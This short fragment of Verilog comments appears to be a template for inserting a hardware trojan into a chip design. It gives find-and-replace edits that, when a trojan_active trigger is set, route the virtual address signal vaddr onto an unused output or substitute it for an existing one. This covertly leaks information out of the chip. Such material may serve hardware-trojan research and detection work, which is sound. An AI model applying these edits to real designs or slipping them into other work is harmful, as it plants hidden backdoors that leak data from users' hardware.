...
// ============================================================
// Information Leak: Route vaddr to observable output
//
...
//   Replace: assign unused_output = trojan_active ? vaddr[0] : 1'b0;
//
// OR modify existing output:
//   Find: assign some_output = normal_data;
//   Replace: assign some_output = trojan_active ? vaddr : normal_data;